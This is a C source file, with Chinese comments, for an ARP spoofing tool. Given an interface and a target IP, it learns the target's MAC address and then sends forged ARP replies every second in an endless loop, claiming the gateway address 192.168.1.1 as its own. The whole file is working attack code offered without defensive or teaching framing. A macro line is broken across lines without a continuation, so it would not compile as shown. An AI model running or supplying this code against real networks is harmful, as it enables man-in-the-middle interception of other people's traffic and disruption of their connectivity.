#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

/* 以太网帧首部长度 */
#define ETHER_HEADER_LEN sizeof(struct ether_header)
/* 整个 arp 结构长度 */
#define ETHER_ARP_LEN sizeof(struct ether_arp)
/* 以太网 + 整个 arp 结构长度 */
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN +
ETHER_ARP_LEN
/* IP 地址长度 */
#define IP_ADDR_LEN 4
/* 广播地址 */
#define BROADCAST_ADDR                                                         \
  { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }

unsigned char tarmac[6] = BROADCAST_ADDR;

void err_exit(const char *err_msg) {
  perror(err_msg);
  exit(1);
}

/* 填充 arp 包 */
struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr,
                                  const unsigned char *dst_mac_addr,
                                  const char *src_ip, const char *dst_ip,
                                  int op) {
  struct ether_arp *arp_packet;
  struct in_addr src_in_addr, dst_in_addr;
  /* IP 地址转换 */
  inet_pton(AF_INET, src_ip, &src_in_addr);
  inet_pton(AF_INET, dst_ip, &dst_in_addr);
  /* 整个 arp 包 */
  arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
  arp_packet->arp_hrd = htons(ARPHRD_ETHER);
  arp_packet->arp_pro = htons(ETHERTYPE_IP);
  arp_packet->arp_hln = ETH_ALEN;
  arp_packet->arp_pln = IP_ADDR_LEN;
  arp_packet->arp_op = htons(op);
  memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
  memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
  memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
  memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);
  return arp_packet;
}

/* arp 请求 */
void arp_request(const char *if_name, const char *dst_ip) {
  struct sockaddr_ll saddr_ll;
  struct ether_header *eth_header;
  struct ether_arp *arp_packet;
  struct ifreq ifr;
  char buf[ETHER_ARP_PACKET_LEN];
  char recvbuf[ETHER_ARP_PACKET_LEN];
  unsigned char src_mac_addr[ETH_ALEN];
  unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
  char *src_ip;
  char *gateway_ip = "192.168.1.1";
  int sock_raw_fd, ret_len, i;
  if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    err_exit("socket()");
  bzero(&saddr_ll, sizeof(struct sockaddr_ll));
  bzero(&ifr, sizeof(struct ifreq));
  /* 网卡接口名 */
  memcpy(ifr.ifr_name, if_name, strlen(if_name));
  /* 获取网卡接口索引 */
  if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
    err_exit("ioctl() get ifindex");
  saddr_ll.sll_ifindex = ifr.ifr_ifindex;
  saddr_ll.sll_family = PF_PACKET;
  /* 获取网卡接口 IP */
  if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1)
    err_exit("ioctl() get ip");
  src_ip = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);
  printf("local ip:%s\n", src_ip);
  /* 获取网卡接口 MAC 地址 */
  if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
    err_exit("ioctl() get mac");
  memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
  printf("local mac");
  for (i = 0; i < ETH_ALEN; i++)
    printf(":%02x", src_mac_addr[i]);
  printf("\n");
  bzero(buf, ETHER_ARP_PACKET_LEN);
  /* 填充以太首部 */
  eth_header = (struct ether_header *)buf;
  memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
  memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
  eth_header->ether_type = htons(ETHERTYPE_ARP);
  /* arp 包 */
  arp_packet =
      fill_arp_packet(src_mac_addr, tarmac, src_ip, dst_ip, ARPOP_REQUEST);
  memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
  socklen_t len = sizeof(struct sockaddr_ll);
  ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0,
                   (struct sockaddr *)&saddr_ll, len);
  if (ret_len == 42)
    printf("send arp request ok!!!\n");
  ret_len =
      recvfrom(sock_raw_fd, recvbuf, 42, 0, (struct sockaddr *)&saddr_ll, &len);
  if (ret_len == 42) {
    if (!memcmp(recvbuf + 28, buf + 38, 4)) {
      memcpy(tarmac, recvbuf + 22, 6);
      printf("Target mac: %02x:%02x:%02x:%02x:%02x:%02x\n", tarmac[0],
             tarmac[1], tarmac[2], tarmac[3], tarmac[4], tarmac[5]);
    }
  }
  sleep(1);
  while (1) {
    // 修改 eth 包中的 dst mac
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    arp_packet =
        fill_arp_packet(src_mac_addr, tarmac, gateway_ip, dst_ip, ARPOP_REPLY);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
    socklen_t len = sizeof(struct sockaddr_ll);
    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0,
                     (struct sockaddr *)&saddr_ll, len);
    if (ret_len == 42)
      printf("send arp reply ok!!!\n");
    sleep(1);
  }
  close(sock_raw_fd);
}

int main(int argc, const char *argv[]) {
  if (argc != 3) {
    printf("usage:%s device_name dst_ip\n", argv[0]);
    exit(1);
  }
  arp_request(argv[1], argv[2]);
  return 0;
}